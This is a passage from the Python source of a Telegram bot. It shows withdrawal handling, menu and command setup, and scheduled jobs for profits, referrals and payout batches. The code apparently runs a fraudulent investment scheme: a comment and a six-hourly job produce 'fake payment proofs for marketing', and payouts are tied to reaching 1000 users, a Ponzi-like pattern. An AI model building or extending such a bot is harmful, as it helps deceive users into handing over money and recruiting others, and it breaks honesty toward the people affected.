                users_db[user_id]['withdrawable_profit'] = 0
                
                # Record transaction
                transactions_db.append({
                    "user_id": user_id,
                    "amount": amount,
                    "type": "withdrawal",
                    "status": "completed",
                    "timestamp": datetime.now(NIGERIA_TZ)
                })
                
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"💳 Payment processed! ₦{amount:,} has been sent to your bank account."
                )
            except Exception as e:
                logger.error(f"Failed to process payment for {user_id}: {e}")
        
        # Create fake payment proofs for marketing
        await send_payment_proofs(context)

async def setup_bot_menu(application: Application):
    """Set up the bot's menu button to open the web app"""
    try:
        if not WEB_APP_URL:
            logger.error("WEB_APP_URL environment variable is not set")
            return
            
        await application.bot.set_chat_menu_button(
            menu_button={
                "type": "web_app", 
                "text": "Open App", 
                "web_app": {"url": str(WEB_APP_URL)}
            }
        )
        logger.info("Bot menu button configured successfully")
        
        commands = [
            ("start", "Start the bot"),
            ("menu", "Open main menu"),
            ("referral", "Get your referral link"),
            ("help", "Get help information")
        ]
        await application.bot.set_my_commands(commands)
        logger.info("Bot commands configured successfully")
    except Exception as e:
        logger.error(f"Error setting up bot menu: {e}")

# ===== MAIN SETUP =====
def main():
    """Start the bot."""
    application = Application.builder().token(TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("menu", menu))
    application.add_handler(CommandHandler("stats", admin_stats))
    
    # Conversation handlers
    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(admin_announce, pattern="^admin_announce$")
        ],
        states={
            AWAITING_ANNOUNCEMENT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_announcement)
            ]
        },
        fallbacks=[
            CommandHandler("cancel", lambda update, context: ConversationHandler.END)
        ]
    )
    application.add_handler(conv_handler)
    
    # Callback query handlers
    application.add_handler(CallbackQueryHandler(show_balance, pattern="^balance$"))
    application.add_handler(CallbackQueryHandler(show_referrals, pattern="^referrals$"))
    application.add_handler(CallbackQueryHandler(show_verify, pattern="^verify$"))
    application.add_handler(CallbackQueryHandler(show_withdraw, pattern="^withdraw$"))
    application.add_handler(CallbackQueryHandler(show_trading, pattern="^trading$"))
    application.add_handler(CallbackQueryHandler(toggle_trading, pattern="^toggle_trading$"))
    application.add_handler(CallbackQueryHandler(show_games_menu, pattern="^games_menu$"))
    application.add_handler(CallbackQueryHandler(handle_game_selection, pattern="^game_"))
    application.add_handler(CallbackQueryHandler(handle_memory_click, pattern="^memory_"))
    application.add_handler(CallbackQueryHandler(roll_dice, pattern="^dice_roll$"))
    application.add_handler(CallbackQueryHandler(start, pattern="^main_menu$"))
    application.add_handler(CallbackQueryHandler(admin_process_batch, pattern="^admin_process_batch$"))
    application.add_handler(CallbackQueryHandler(why_verify, pattern="^why_verify$"))
    application.add_handler(CallbackQueryHandler(check_batch, pattern="^check_batch$"))
    application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_to_menu$"))
    
    # Scheduled jobs
    job_queue = application.job_queue
    job_queue.run_repeating(calculate_daily_profits, interval=3600, first=10)  # Hourly
    job_queue.run_repeating(reset_daily_limits, interval=86400, first=60)  # Daily
    job_queue.run_repeating(send_payment_proofs, interval=21600, first=120)  # Every 6 hours
    job_queue.run_repeating(send_automatic_messages, interval=60, first=10)  # Every minute
    job_queue.run_repeating(process_payment_batches, interval=21600, first=60)  # Every 6 hours
    
    # Setup bot menu
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(setup_bot_menu(application))
    
    # Webhook setup
    if WEBHOOK_URL:
        if not WEBHOOK_URL.startswith("https://"):
            logger.error("Invalid WEBHOOK_URL: Must start with 'https://'")
            raise ValueError("Invalid WEBHOOK_URL: Must start with 'https://'")
        application.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=f"api/telegram-webhook/{TOKEN}",
            webhook_url=f"{WEBHOOK_URL}/api/telegram-webhook/{TOKEN}"
        )
        logger.info(f"Webhook running at {WEBHOOK_URL}/api/telegram-webhook/{TOKEN}")
    else:
        application.run_polling()
        logger.info("Bot running in polling mode")

if __name__ == "__main__":
    # Initialize first payment batch
    payments_db.append({
        'id': 1,
        'target_users': 1000,
        'current_users': 0,
        'payout_date': None,
        'completed': False
    })
    
    main()
